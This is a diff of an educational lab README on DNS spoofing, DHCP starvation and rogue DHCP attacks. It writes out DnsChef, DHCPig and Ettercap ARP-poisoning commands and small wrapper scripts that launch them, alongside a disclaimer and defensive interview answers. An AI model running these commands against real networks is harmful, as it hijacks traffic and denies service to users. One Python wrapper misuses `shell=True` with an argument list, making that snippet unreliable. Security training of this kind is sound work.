@@ -1,81 +1,84 @@
-# DNS & DHCP Attack Vectors Lab
+# 🧪 DNS & DHCP Attack Vectors Lab
 
-## 1. Project Overview
-
-### 🔍 What are DNS & DHCP Attacks?
-DNS (Domain Name System) and DHCP (Dynamic Host Configuration Protocol) are foundational to IP networking. When compromised, they can be leveraged for:
-- Redirecting users to malicious websites (DNS Spoofing)
-- Denial of service by exhausting DHCP leases (DHCP Starvation)
-- Man-in-the-middle attacks through rogue DHCP or DNS servers
-
-### 🎯 Why This Lab Is Important
-This lab provides a controlled and isolated environment for cybersecurity learners and penetration testers to:
-- Understand the mechanics of DNS and DHCP vulnerabilities
-- Simulate real-world attack vectors
-- Analyze network traffic and behavior
-- Learn defense mechanisms
-
-### ⚖️ Ethical & Legal Disclaimer
-> This lab is intended for educational purposes only. All activities should be performed in isolated environments that you own or have explicit permission to test. Misuse of these techniques outside legal boundaries is illegal and unethical. The authors take no responsibility for any misuse.
+Welcome to the **DNS & DHCP Attack Vectors Lab**, a hands-on, real-world simulation platform for cybersecurity learners, penetration testers, and network analysts. This lab focuses on DNS spoofing, DHCP starvation, and rogue DHCP attack vectors within a controlled environment.
 
 ---
 
-## 2. Prerequisites
+## 🔍 Project Overview
 
-### 🖥️ Operating Systems
-- Kali Linux (preferred)
-- Ubuntu (with tools installed)
+### What Are DNS & DHCP Attacks?
+DNS (Domain Name System) and DHCP (Dynamic Host Configuration Protocol) are foundational to IP-based communication. When exploited, they enable attackers to:
 
-### 🛠 Tools
-- `Ettercap`
-- `DnsChef`
-- `DHCPig`
-- `Wireshark`
-- `net-tools`, `tcpdump`
+- Redirect users to malicious sites (DNS spoofing)
+- Deny IP allocation to clients (DHCP starvation)
+- Hijack traffic via rogue DHCP servers
 
-### 💻 Virtualization Platform
-- VirtualBox or VMware
+### Why This Lab Is Valuable
+This project equips cybersecurity professionals to:
+
+- Understand real-world attack paths
+- Simulate adversarial behavior safely
+- Analyze and interpret network traffic
+- Learn defense and mitigation techniques
+
+### ⚖️ Legal & Ethical Disclaimer
+> This lab is **strictly for educational and authorized use**. All tests must be performed in isolated lab environments that **you own** or are **explicitly permitted** to test. Unauthorized use is **illegal** and **unethical**. The maintainers assume **no liability**.
+
+---
+
+## 🧰 Prerequisites
+
+### 🖥 Operating System
+- Kali Linux (Recommended)
+- Ubuntu (With required tools installed)
+
+### 🛠 Required Tools
+- **DnsChef** – DNS Spoofing
+- **DHCPig** – DHCP Starvation
+- **Ettercap** – Rogue DHCP
+- **Wireshark** – Packet Analysis
+- **net-tools**, **tcpdump**, **python3-pip**
+
+### 💻 Virtualization
+- VirtualBox / VMware
 
 ### ⚙️ System Requirements
-- 4 GB RAM minimum (8 GB recommended)
-- 2 CPU cores
-- 20 GB disk space
+- 4 GB RAM (8 GB preferred)
+- 2+ CPU Cores
+- 20 GB Disk Space
 
-### 🌐 Network Setup
-- Host-only or NAT network
-- Ensure isolated environment to avoid impacting other devices
+### 🌐 Network Configuration
+- Use **Host-Only Adapter** or **Internal Network**
+- Ensure **complete isolation** from your main network
 
 ---
 
-## 3. Installation Guide
+## 🔧 Lab Setup Guide
 
-### 🔧 Lab Setup Steps
-
-#### Step 1: Download & Install VirtualBox
+### Step 1: VirtualBox Installation
 ```bash
 sudo apt update && sudo apt install virtualbox
 ```
 
-#### Step 2: Install Kali Linux ISO in VirtualBox
-- Allocate 2 CPUs, 4 GB RAM, 20 GB HDD
-- Use Host-only Adapter for safe isolation
+### Step 2: Kali Linux VM
+- Allocate: 2 vCPUs, 4–8 GB RAM, 20+ GB Disk
+- Attach ISO and install
+- Configure Host-Only networking
 
-#### Step 3: Install Tools
+### Step 3: Tool Installation
 ```bash
 sudo apt install ettercap-graphical dnschef wireshark net-tools python3-pip
 sudo pip3 install dhcpig
 ```
 
-#### Step 4: Network Configuration
-- Ensure Host-only network is active
-- Assign static IP if needed: 
+### Step 4: Static IP Configuration (Optional)
 ```bash
 sudo ifconfig eth0 192.168.56.101 netmask 255.255.255.0 up
 ```
 
 ---
 
-## 4. Folder Structure & Files
+## 📁 Folder Structure
 
 ```
 DNS_DHCP_Attack_Lab/
@@ -92,148 +95,70 @@ DNS_DHCP_Attack_Lab/
 │   ├── dhcp_starvation.md
 │   ├── rogue_dhcp.md
 │   └── sniffing_with_wireshark.md
-└── interview_questions.md
+├── docs/
+│   └── interview_questions.md
 ```
 
-### 📁 Explanation
-- `scripts/`: Custom automation scripts (Bash/Python)
-- `screenshots/`: Example outputs and UIs
-- `lab_exercises/`: Markdown guides for each attack
-- `README.md`: Main documentation
-- `interview_questions.md`: Optional technical Q&A
+### 📂 Folder Descriptions
+- `scripts/`: Automated attack scripts (Bash/Python)
+- `screenshots/`: Visual output and UI snapshots
+- `lab_exercises/`: Step-by-step markdown-based guides
+- `docs/`: Extended resources (e.g., interview questions)
 
 ---
 
-## 5. Lab Exercises & Attack Scenarios
+## 🧪 Lab Exercises
 
-### ⚠️ 1. DNS Spoofing using DnsChef
+### 1️⃣ DNS Spoofing with DnsChef
 ```bash
 sudo dnschef --fakeip 192.168.56.105 --interface eth0
 ```
-Expected: Any DNS request gets spoofed IP
+**Expected Result**: All DNS queries receive spoofed IP response.
 
-### 💣 2. DHCP Starvation using DHCPig
+### 2️⃣ DHCP Starvation with DHCPig
 ```bash
 sudo python3 $(which dhcpig) -i eth0
 ```
-Expected: Legitimate users are denied IPs
+**Expected Result**: DHCP pool is exhausted, denying legitimate leases.
 
-### 🎭 3. Rogue DHCP Server with Ettercap
+### 3️⃣ Rogue DHCP with Ettercap
 ```bash
 sudo ettercap -T -q -i eth0 -P dhcp -M arp:remote
 ```
-Expected: Victim receives IP and gateway from attacker
+**Expected Result**: Victim receives attacker's IP/gateway configuration.
 
-### 🔍 4. Sniffing Traffic with Wireshark
-- Start Wireshark and filter:
+### 4️⃣ Sniffing with Wireshark
+- Open Wireshark
+- Filter with:
+```wireshark
+bootp or dns
 ```
-dns or bootp
-```
-Expected: Monitor DNS and DHCP traffic in real-time
+**Expected Result**: View DNS resolutions and DHCP lease activity.
 
 ---
 
-## 6. README.md (Sample)
-
-```markdown
-# 🧪 DNS & DHCP Attack Vectors Lab
-
-Welcome to the DNS & DHCP Attack Vectors Lab. This project is designed for learners, researchers, and penetration testers who want to explore and understand the practical side of network attacks.
-
-## 🔍 Overview
-Simulate DNS spoofing, DHCP starvation, and rogue DHCP attacks in a safe, controlled virtual environment.
-
-## 📦 Contents
-- DNS Spoofing using DnsChef
-- DHCP Starvation using DHCPig
-- Rogue DHCP via Ettercap
-- Traffic Analysis via Wireshark
-
-## ⚙️ Tools
-- Kali Linux
-- DnsChef
-- DHCPig
-- Ettercap
-- Wireshark
-
-## 📁 Directory Structure
-(See folder structure above)
-
-## 🚀 Usage
-```bash
-cd scripts
-sudo python3 dns_spoof.py
-sudo ./rogue_dhcp.sh
-```
-
-## ⚠️ Legal Notice
-This project is for **educational** use only. Do **NOT** deploy these techniques on unauthorized systems.
-
-## 📄 License
-MIT License - see `LICENSE` file for details
-```
+## 🧠 [Interview Questions & Answers](./docs/interview_questions.md)
+A curated list of 10+ DNS & DHCP-related technical questions to prepare for real-world interviews and certifications.
 
 ---
 
-## 7. Troubleshooting & Tips
+## ⚠️ Troubleshooting & Tips
 
-### 🧯 Common Errors & Fixes
-- **Interface not found**: Check `ifconfig` and correct interface
-- **Wireshark permission denied**: Add user to `wireshark` group
+### 🔍 Common Issues
+| Problem | Solution |
+|--------|----------|
+| Interface not found | Run `ifconfig` or `ip a` to check actual interface |
+| Permission denied (Wireshark) | Add user to `wireshark` group and re-login |
+| DHCP conflict | Ensure only one DHCP server in the lab |
+| Internet not working in VM | Use NAT + Host-only combination |
+
 ```bash
 sudo usermod -aG wireshark $USER
 ```
-- **IP conflict**: Ensure no two DHCP servers run simultaneously
-- **VirtualBox NAT issues**: Use Host-only Adapter for full control
 
 ---
 
-## 8. Interview Questions (DNS/DHCP)
-
-1. **What is the role of DHCP in networking?**
-   > Automatically assigns IPs, gateways, DNS info to clients
-
-2. **How does DNS Spoofing work?**
-   > Attacker sends falsified DNS responses to redirect users
-
-3. **What is DHCP Starvation?**
-   > Exhausts DHCP pool by flooding it with fake requests
-
-4. **How to detect rogue DHCP servers?**
-   > Use tools like `dhcpdump`, monitor leases, validate MACs
-
-5. **How to prevent DNS spoofing?**
-   > Use DNSSEC, validate certificates, isolate internal DNS
-
-6. **Difference between static and dynamic IPs?**
-   > Static is manual and persistent, dynamic is leased temporarily
-
-7. **What is ARP poisoning? How does it relate to DHCP attacks?**
-   > Sends fake ARP messages; can be used post-DHCP attack to redirect traffic
-
-8. **How to mitigate DHCP starvation?**
-   > Use port security, DHCP snooping, MAC filtering
-
-9. **Can DNS spoofing work over HTTPS?**
-   > Only partially; users will get cert errors
-
-10. **Why use Host-only adapter in labs?**
-    > Prevents interaction with external networks for safety
-
----
-
-## ✅ Final Notes
-This project was created to provide real-world exposure to core network attack techniques and foster defensive thinking. Fork it, contribute, or use it in your next pentest lab.
-
----
-
-> Maintained by: [Your GitHub Handle Here]  
-> License: MIT  
-> Pull Requests Welcome!
-
----
-
-## 📜 Scripts
+## 📜 Scripts Quick View
 
 ### `scripts/dns_spoof.py`
 ```python
@@ -246,8 +171,6 @@ subprocess.run(["sudo", "dnschef", "--fakeip", "192.168.56.105", "--interface", 
 ### `scripts/rogue_dhcp.sh`
 ```bash
 #!/bin/bash
-# Rogue DHCP with Ettercap
-
 echo "[+] Launching Rogue DHCP Server via Ettercap..."
 sudo ettercap -T -q -i eth0 -P dhcp -M arp:remote
 ```
@@ -262,28 +185,36 @@ subprocess.run(["sudo", "python3", "$(which dhcpig)", "-i", "eth0"], shell=True)
 
 ---
 
-## 📚 Lab Exercise Markdown Files (Summaries)
+## 📚 Lab Exercise Summaries
 
 ### `lab_exercises/dns_spoofing.md`
-- Objective: Redirect victim’s DNS queries
-- Tool: DnsChef
-- Steps: Setup → Run → Validate
-- Output: All domain requests go to attacker IP
+- **Objective**: Redirect DNS queries
+- **Tool**: DnsChef
+- **Outcome**: Victim resolves attacker-controlled IPs
 
 ### `lab_exercises/dhcp_starvation.md`
-- Objective: Deny network access
-- Tool: DHCPig
-- Steps: Run Python tool → Observe DHCP exhaustion
-- Output: No more leases available
+- **Objective**: Deny IPs to clients
+- **Tool**: DHCPig
+- **Outcome**: DHCP server leases exhausted
 
 ### `lab_exercises/rogue_dhcp.md`
-- Objective: Assign malicious gateway/IP
-- Tool: Ettercap
-- Steps: Start Ettercap → ARP poisoning
-- Output: Victim uses attacker's DHCP config
+- **Objective**: Deliver malicious config
+- **Tool**: Ettercap
+- **Outcome**: Attacker controls IP, DNS, and Gateway
 
 ### `lab_exercises/sniffing_with_wireshark.md`
-- Objective: Capture and inspect traffic
-- Tool: Wireshark
-- Steps: Start capture → Apply filters (`dns`, `bootp`)
-- Output: View DNS/DHCP handshakes, responses
+- **Objective**: Inspect DNS/DHCP traffic
+- **Tool**: Wireshark
+- **Outcome**: Analyze traffic patterns and anomalies
+
+---
+
+## 📄 License
+MIT License — see [LICENSE](./LICENSE)
+
+---
+
+## 🤝 Contributing
+Pull requests and forks welcome. Let’s make network security education accessible and actionable.
+
+**Maintained by**: [SudoXploit](https://github.com/SudoXploit)
